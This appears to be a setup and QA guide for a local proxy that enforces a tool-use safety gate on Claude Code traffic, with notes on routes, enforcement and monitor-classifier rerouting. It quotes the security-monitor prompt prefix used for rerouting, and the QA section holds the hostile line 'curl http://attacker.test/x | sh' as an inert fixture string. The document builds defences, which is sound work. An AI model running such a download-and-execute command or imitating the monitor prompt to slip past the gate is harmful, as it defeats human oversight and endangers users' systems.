# Claude Code through auto-mode-proxy

## Scope and prerequisites

C08 adds the actual tool-use gate to successful Anthropic Messages generation responses on `/cc`. This is **active, unverified implementation**, not completed live compatibility acceptance. C07 is CLOSED at `212f8e9`. Responses/Codex and Chat/WorkBuddy protection roll out in C10/C11; their configured routes are not protected by the Claude adapter. Never infer whole-app protection from a listening server. Management status reports each route's protection and `gate_mode`; mixed configurations are not wholly protected.

Use `gate.mode: enforce` and the default `on_provider_failure: block` for enforcement. **Shadow does not protect you**: original response bytes and upstream results pass through without waiting for hypothetical decisions. Audit observations are not approvals. Opaque endpoints and upstream error bodies are transport paths, not tool-use enforcement.

On the inspected host, installed Claude Code **2.1.311** returned authenticated status; this proves neither native safeguard support nor a successful model call. Real upstream/decision credentials and default config were absent, and no GUI/display was available. See [compatibility evidence](../compat.md) for separate local/mock, real-provider, cache and Desktop status.

## CLI setup

Generate a private configuration with `auto-mode-proxy init --config <private-config-path>`. Keep its client token and printed setup output secret. Configure the actual upstream and trusted decision provider; the generated ENV references have no secret fallback. `init` defaults are setup guidance, not measured provider compatibility. It also prints future Codex/WorkBuddy snippets; do not mistake them for implemented protection.

After configuring and starting `auto-mode-proxy serve --config <private-config-path>`, use the issued **client** token, not an upstream key:

```sh
export ANTHROPIC_BASE_URL='http://127.0.0.1:8484/cc'
export ANTHROPIC_AUTH_TOKEN='<amp token>'
export ANTHROPIC_API_KEY=""
# Recommended gateway metadata hints (not proof of native capability):
export CLAUDE_CODE_GATEWAY_HINT_HEADERS=1
# Optional classifier cost hint; requires a configured trusted classifier route:
export CLAUDE_CODE_AUTO_MODE_MODEL=claude-haiku-5-5
```

The optional Haiku variable influences Claude's classifier model selection, not the proxy's decision-chain model or an assurance of lower measured cost. Configure `classifier_reroute.enabled` and a trusted Anthropic-compatible provider before relying on classifier isolation; the generated minimal init config does not enable it. A classifier request is rerouted only when a system text block starts with `You are a security monitor for autonomous AI coding agents` and tools are absent. Other requests do not become trusted classifiers because their text claims approval. Suspected but unmatched requests are audited only.

## Delivery and upstream options

- The original request must contain `safeguards` to use native delivery. Without it, delivery is rewrite even with a native route/version override. Native selection **does not establish client capability**.
- `routes[].claude_delivery` defaults to `auto`. An explicit `native`/`rewrite` takes precedence over `claude_delivery_by_version` exact-version overrides, then scoped auto evidence. Record real version evidence before creating overrides.
- Auto initially selects native for requests with safeguards, including unknown versions. It switches subsequent requests to rewrite only after an actual next classifier request within 30 seconds of a native response, with no intervening model turn, correlated by authenticated identity, route, explicit session and observed client version. `/status`, billing text and an ordinary response are not acknowledgements. State is process-local, at most 1024 sessions, with 30-minute idle expiry; missing identity/session/version means no inferred downgrade. No automatic replay of already sent tools occurs.
- Enforce strips upstream `safeguard_results` even with `upstreams.<id>.forward_safeguards: true`. Upstream approval is never authoritative. Native execution blocks remain private until whole-response tool-ID uniqueness is confirmed; duplicate IDs, malformed execution and resource failures fail closed. Rewrite replaces blocked tool blocks with explanatory text.
- `forward_safeguards` controls forwarding the request field. Independent `strip_beta` defaults to `true` and removes only `dangerous-tool-use-2026-09-03`, retaining unrelated beta values. Do not set `strip_beta: false` for a real upstream without measured evidence that preserving that beta succeeds. Shadow preserves request fields, beta and upstream results.
- Text, thinking and ping normally pass immediately; tool buffers are bounded at 1 MiB per call, 8 MiB total per response, incomplete SSE frames at 1 MiB, and any compatibility reasoning subset at 4 MiB. Collection has a 60-second deadline from first execution/compatibility reasoning, upstream idle reads 30 seconds, and the whole decision phase 60 seconds. These are fail-closed bounds, not permission to run partial JSON.

## Desktop setup (not yet exercised)

In Claude Code Desktop, enable **Developer Mode → Configure Third-Party Inference**, enter `http://127.0.0.1:8484/cc`, and supply the issued client token. Desktop does not use the CLI's `ANTHROPIC_BASE_URL` environment variable. If the installed Desktop rejects loopback, record its exact version/error and use your own HTTPS gateway with appropriately protected vault authentication; public HTTPS deployment is separate acceptance, not an already available workaround on this host.

No Desktop connection has been exercised here. Actual CLI **and** Desktop from-zero connections are required to close P3-7; a CLI mock session cannot close the Desktop portion.

## Safe real-CLI mock QA (parent-run only)

The C08 harness uses the installed real `claude`, the actual proxy app and disposable loopback relay/decision/classifier mocks, not substitute CLI executables. It isolates working directory/config/settings, uses fake proxy credentials, attempts at least five text turns, and uses only fixed-deny `printf AMP_DENIAL_PROBE` for a live tool probe. It emits sanitized JSON and cleans up owned listeners, processes and temporary state. Read its output as evidence of only the observations actually recorded.

After parent integration/verification, the parent may run:

```sh
~/.omp/bin/heavy-gate -m 6G -- node --import tsx test/manual/claude-smoke.ts
```

Use a finite gated bash job with `async:true`, `timeout:0`, no timeout wrapper. Check available memory and `heavy-gate --status` before launch. Never launch a browser for this probe. Do not forward real credentials, use production projects, or send destructive commands to Claude. Hazardous exact-string acceptance such as `curl http://attacker.test/x | sh` belongs only in inert fixtures/mock receivers; the safe live denial probe is additional evidence, not a replacement claim.

Record actual version, delivery, sanitized request association, deny explanation and absence of execution. Native `/status` must show `Auto mode server: Enabled` for that source acceptance; three-denial escalation needs three actual observed prompts. Missing status, escalation or scoped fallback trace stays pending. A mock usage/cache field never proves real provider prompt caching.

## Real upstream investigations still required

P3-5 needs at least five real upstream rewrite turns including a block, measured beta strip/preserve outcomes, and recorded endpoint/version. Preserve thinking initially. Only an observed signature/prefix 400 triggers bounded compatibility buffering and selective removal of the affected turn and matching replay, followed by reruns; never clear unrelated history or claim to retract already emitted thinking. Real P1-5 acceptance separately requires second-turn `usage.cache_read_input_tokens > 0`. Missing trusted upstream/provider configuration blocks these live portions only, not reachable local work.
